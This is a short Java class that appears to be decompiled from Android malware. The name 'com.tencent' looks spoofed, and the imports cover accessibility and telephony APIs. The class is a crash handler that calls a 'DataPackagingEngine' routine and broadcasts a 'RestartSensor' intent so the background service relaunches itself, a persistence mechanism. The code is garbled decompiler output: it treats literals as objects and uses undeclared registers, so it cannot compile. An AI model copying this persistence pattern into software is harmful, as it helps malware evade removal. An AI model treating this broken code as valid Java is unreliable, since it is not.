package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: MainBackgroundService_MyExceptionHandler
 * Original: Lcom/tencent/tunesxconcerningn1011$MyExceptionHandler;
 */
public class MainBackgroundService_MyExceptionHandler implements Thread$UncaughtExceptionHandler; {

    // === FIELDS ===
    private final Class myActivityClass;
    private final Context myContext;
    final MainBackgroundService this$0;

    // === METHODS ===

    public void Constructor(MainBackgroundService param0, Context param1, Class param2) {
        v0.this$0 = v1;
        // new Object()
        v0.myContext = v2;
        v0.myActivityClass = v3;
        return;
    }

    public void uncaughtException(Thread param0, Throwable param1) {
        v3 = v2.myContext;
        v4 = "Error";
        v0 = 180000;
        DataPackagingEngine.phonixeffect(v3, "Error", 180000, v1);
        v3 = v2.this$0;
        v1 = 180000.getApplicationContext();
        v1 = RestartSensorReceiver.class;
        // new Intent(180000, v1)
        "Error".setAction("RestartSensor");
        v3.sendBroadcast("Error");
        return;
    }
}
